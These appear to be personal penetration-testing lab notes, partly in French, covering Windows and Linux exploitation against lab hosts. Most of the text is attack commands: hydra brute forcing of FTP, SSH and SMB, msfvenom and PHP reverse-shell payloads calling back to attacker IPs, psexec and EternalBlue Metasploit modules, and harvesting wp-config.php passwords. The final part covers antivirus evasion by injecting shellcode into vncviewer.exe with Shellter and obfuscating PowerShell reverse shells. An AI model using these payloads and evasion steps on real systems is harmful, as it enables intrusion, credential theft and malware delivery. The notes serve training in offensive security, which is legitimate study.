#exploitation 
#### Vulns scanning

Nmap NSE
```bash
ls -la /usr/share/nmap/scripts | grep "service"
```

#### Search for exploit

searchsploit
//commandes à ajouter (option -m, -w, etc)

#### Bind & reverse shells

Bind shell
Reverse shell
- revshell.com
- payloads all the things (Github)

#### Exploitation framework

###### MSF

###### Empire / Starkiller

#### Windows exploitation - Black Box
#windowsexploitation 
Black box methodo
- Host discovery
- Port scanning / enumeration
- vulnerability detection/scanning
- Exploitation
	- manual
	- automated
- PE
	- Privesc
	- Perstitence
	- Dumping hashes

###### Port scaning / Enumeration

```bash

#only info : 10.0.22.85 demo.ine.local
mkdir cible
cd cible

ping 10.0.22.85
nmap -sV. 10.0.22.85
#21,22,80,139,445,3306,3389,...

nmap -T4 -PA -sC -sV -p 1 10000 10.0.22.85 -oX nmap_10k
nc -nc 10.0.22.85 21
#look in web app

service postgresql start
msfconsole
workspace -a cible
dm_import ~/cible/nmap_10k
services

exit
nmap -T4 -PA -sC -sV -p- 10.0.22.85 -oX nmap_all
nmap -sU -sV 10.0.22.85

```

###### Targeting IIS FTP

on windows server, ftp is a part of IIS

```bash
#test for anonymous login is enable
ls -al /usr/share/nmap/scripts/ | grep ftp-
nmap -p 21 -sV --script=ftp-anon 10.0.22.85
ftp 10.0.22.85 21
#not enabled

#bruteforce
hydra -L /usr/share/wordlits/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.22.85 ftp
#find aministrator creds
#then vagrant user

ftp 10.0.22.85
administrator
vagrant
ls

#generaly IIS can execute asp file
#if it's true, can try a reverse shell
exit
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.2 LPORT=1234 -f aspx > shel.aspx

ftp 10.0.22.85 é&
administrator
vagrant
put shell.aspx

msfconsole
use multi/handler
set paylaod windows/shell/reverse_tcp
set LHOST 10.10.16.2
set LPORT 1234
run
#go on web and load the payload
#not working


```

###### OpenSSH

```bash

nmap -sV -sC -p 22 10.0.26.161

searchsploit openssh 7.1
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt 10.0.26.161 ssh
#password : vagrant
hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt 10.0.26.161 ssh

ssh vagrant@10.0.26.161
whoami
bash
net localgroup vagrant
whoami /priv

#new tab
msfconsole
search ssh_login
use auxiliary/scanner/ssh/ssh_login
set USERNAME vagrant
set PASSWORD vagrant
set RHOSTS 10.0.26.161
run
sessions 1
CTRL+Z
sessions -u 1


```

###### SMB
#smb
```bash

nmap -sV -sC -p 445 10.0.31.252

hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt 10.0.31.252 smb -t 4
#password vagrant

smbclient -L 10.0.31.252 -U vagrant
smbmap -u vagrant -p vagrant -H 10.0.31.252

enum4linux -u vagrant -p vagrant -U 10.0.31.252

msfconsole
search smb_enumusers
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 10.0.31.252
set SMBUser vagrant
set SMBPass vagrant
run

locate psexec.py
cp /usr/share/doc/python3-impacket/examples/psexec.py .
chmod +x psexec.py
python3 psexec.py Administrator@10.0.31.252
#shell

msfconsole
search psexec
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
set RHOSTS 10.0.31.252
set SMBUser Administrator
set SMBPass vagrant
run
#meterpreter

search enternalblue

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.31.252
run
#meterpreter

```

###### MySQL DB server

```bash

nmap -sV -sC -p 3306,8585 10.0.25.212

searchsploit MySQL 5.5

msfconsole
search mysql_login
use auxiliary/scanner/mysql_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set RHOSTS 10.0.31.252
#user : root, no password

mysql -u root -p -h 10.0.31.252
show databases;
use cards;
show tables;
select * from table;

#new term
msfconsole
search eternalblue
set RHOSTS 10.0.31.252
run

getuid
#auth/system
cd /
cd wamp
cd www
cd wordpress
cat wp-config.php #db password here
cd ../../
downlaod phpmyadmin.conf

vim phpmyadmin.php
#erase rules

upload phpmyadmin.conf #remplace the original one
shell
net stop wampapache
net start wampapache
#reload web page phpmyadmin



```




#### Linux exploitation
#linuxexploitation
###### vsFTPd

```bash

nmap -sC -sV -p 21 10.2.17.5
ftp 10.2.17.5 21
anonymous
#anon connection
exit

searchsploit vsftpd
searchsploit -m 49757
vim 49757.py

nmap -sV -p 25 10.2.17.5
#smtp enable identification of users on device
msfconsole
search smtp_enum
use auxiliary/scanner/smtp/smtp_enum
RHOST 10.2.17.5
run
#can make bruteforce attack more efficient

hydra -l service /usr/share/metasploit-framework/data/wordlists/unix_users.txt 10.2.17.5 ftp

ftp 10.2.17.5 21
service
password

#target run webdav, go for it for revshell
ls -la /usr/share/webshells
#apache and linux run php
cp /usr/share/sebshells/php/php-reverse-shell.php .
vim php-reverse-shell.php
#change : $ip = '10.10.11.2'

nc -nvlp 1234

ftp 10.2.17.5 21
service
password
cd /var/www/dav
put php-reverse-shell.php
#go in browser

#reverse shell

```

###### PHP

```bash

nmap -sV -sC -p 80 10.2.19.172
#apache running

#on browser test :
#10.2.19.172/phpinfo.php
#get the version

searchsploit php cgi
searchsploit -m 18836.py
vim 18836.py
#can choose the command in changing : pwn_code =
python3 18836.py 10.2.19.172 80

vim 18836.py
pwn_code = """<?php $sock=fsockopen("10.10.11.2",1234);exec("/bin/sh -i <&4 >&4 2>&4)";?>"""
:wq

nc -nvlp 1234

python3 18836.py 10.2.19.172 80

```
#### AV evasion & obfuscation
#AVbypass
AV detection methods :
- Signature based detection
- Heuristic based detection
- Behavior based detection

Evasion techniques

On disk evasion technique :
- Obfuscation : reorganize code to make it harder to analyse / RE
- Encoding : chnaging data format using scheme. can be reversible (!= hashing)
- Packing : genrate exe with new binary structure with smaller size that provide new signature
- Crypters : encrypts and then decrypts in memory, generally the encryption key/function is usually stored in a stub

On memory evasion technique :
- focus on manipulaiton of memory, no writing file to disk
- injects payloads into process by leveraging various windows api
- payload is then executed in memory in a separate thread

###### Shellter

```bash

#need wine to run it
dpkg --add-architecture i386
sudo apt-get install wine32
cd /usr/share/windows-resources/shellter


#choose an executable
#for exemple in kali, windows bin in this folder
cd /usr/share/windows-binaries
#vncviewer.exe
#gonna inject shellcode into this

sudo wine shellter.exe
/home/kali/Desktop/vncviewer.exe
#make a backup
y
L
1
10.10.10.10
1234
python3 -m http.server 80

msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 1234
run

#go on windows machine
#go on browser : http://10.10.10.10 and downlaod the malicious vncviewer
#click on it

#meterpreter

```

###### Obfuscating powershell code

tool : Invoke-Obfuscation (github)

```bash

sudo apt powershell
pwsh #to launch
cd ./Invloke-Obfuscation
Import-Module ./Invoke-Obfuscation.psd1
cd ../
Invoke-Obfuscation

#we re gonna encrypt a powershell code from payloadsallthings
#get the command, chénge IP and port
#save in a file

SET SCRIPTPATH /home/kali/Desktop/shell.ps1
AST
ALL
1
#new obfuscated code

#transfer to victim
#set up a nc
#execute the obfuscated exe



```